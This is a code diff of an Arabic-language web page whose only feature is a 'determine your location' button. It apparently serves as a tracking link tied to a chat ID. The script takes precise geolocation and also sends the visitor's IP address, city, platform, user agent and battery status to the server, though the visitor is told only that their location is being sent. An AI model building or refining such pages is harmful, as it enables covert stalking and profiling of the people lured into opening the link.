@@ -53,119 +53,73 @@
     <div class="container">
         <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
         <div class="loading" id="loading" style="display: none;"></div>
-        <p class="result" id="userLocation"></p>
+        <p id="status"></p>
     </div>
 
-    <form method="POST" action="/submitLocation" id="location-form">
-        <input type="hidden" name="latitude" id="latitude">
-        <input type="hidden" name="longitude" id="longitude">
-        <input type="hidden" name="chatId" id="chatId">
-        <input type="hidden" name="additionalData" id="additionalData">
-    </form>
-
     <script>
+        const statusElement = document.getElementById('status');
+        const loadingElement = document.getElementById('loading');
+
         async function getLocation() {
-            document.getElementById("loading").style.display = "block";
+            loadingElement.style.display = "block";
+            statusElement.textContent = "جاري تحديد الموقع...";
             
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
-            } else {
-                alert("متصفحك لا يدعم تحديد الموقع.");
-                document.getElementById("loading").style.display = "none";
+            try {
+                const position = await getCurrentPosition();
+                await sendLocationData(position);
+                statusElement.textContent = "تم إرسال الموقع بنجاح!";
+            } catch (error) {
+                console.error("Error:", error);
+                statusElement.textContent = "حدث خطأ: " + error.message;
+            } finally {
+                loadingElement.style.display = "none";
             }
         }
 
-        async function showPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const chatId = getParameterByName('chatId');  // احصل على chatId من الـ 
+        function getCurrentPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("متصفحك لا يدعم تحديد الموقع."));
+                }
+                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            });
+        }
 
+        async function sendLocationData(position) {
+            const chatId = new URLSearchParams(window.location.search).get('chatId');
             if (!chatId) {
-                alert("لم يتم استلام معرف الدردشة (chatId).");
-                document.getElementById("loading").style.display = "none";
-                return;
+                throw new Error("معرف المحادثة غير موجود");
             }
 
+            const { latitude, longitude } = position.coords;
             const additionalData = await collectAdditionalData();
 
-            document.getElementById("latitude").value = latitude;
-            document.getElementById("longitude").value = longitude;
-            document.getElementById("chatId").value = chatId;
-            document.getElementById("additionalData").value = JSON.stringify(additionalData);
+            const response = await fetch('/submitLocation', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chatId, latitude, longitude, additionalData })
+            });
 
-            document.getElementById("location-form").submit();
-        }
-
-    
-    console.log("ChatId:", chatId);
-      
-      async function showPosition(position) {
-    if (!navigator.onLine) {
-        alert("لا يوجد اتصال بالإنترنت. يرجى التحقق من اتصالك والمحاولة مرة أخرى.");
-        document.getElementById("loading").style.display = "none";
-        return;
-    }
-
-    // ... (باقي الكود)
-      }
-      
-        function handleError(error) {
-            document.getElementById("loading").style.display = "none";
-            
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("تم رفض طلب تحديد الموقع.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("معلومات الموقع غير متاحة.");
-                    break;
-                case error.TIMEOUT:
-                    alert("انتهت مهلة طلب تحديد الموقع.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("حدث خطأ غير معروف.");
-                    break;
+            if (!response.ok) {
+                throw new Error("فشل في إرسال الموقع");
             }
-        }
 
-        function getParameterByName(name, url = window.location.href) {
-            name = name.replace(/[\[\]]/g, '\\$&');
-            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            return await response.json();
         }
 
         async function collectAdditionalData() {
-            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
             const battery = await navigator.getBattery();
 
             return {
                 ip: ipInfo.ip,
                 country: ipInfo.country_name,
                 city: ipInfo.city,
-                platform: getPlatformInfo().platform,
-                deviceVersion: getDeviceVersion(),
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
                 batteryLevel: battery.level,
                 batteryCharging: battery.charging,
             };
-        }
-
-        function getPlatformInfo() {
-            const ua = navigator.userAgent;
-            if (/Windows/.test(ua)) return { platform: "Windows" };
-            if (/Mac/.test(ua)) return { platform: "MacOS" };
-            if (/Linux/.test(ua)) return { platform: "Linux" };
-            if (/Android/.test(ua)) return { platform: "Android" };
-            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
-            return { platform: "Unknown" };
-        }
-
-        function getDeviceVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            return match ? match[1] : 'Unknown';
         }
     </script>
 </body>
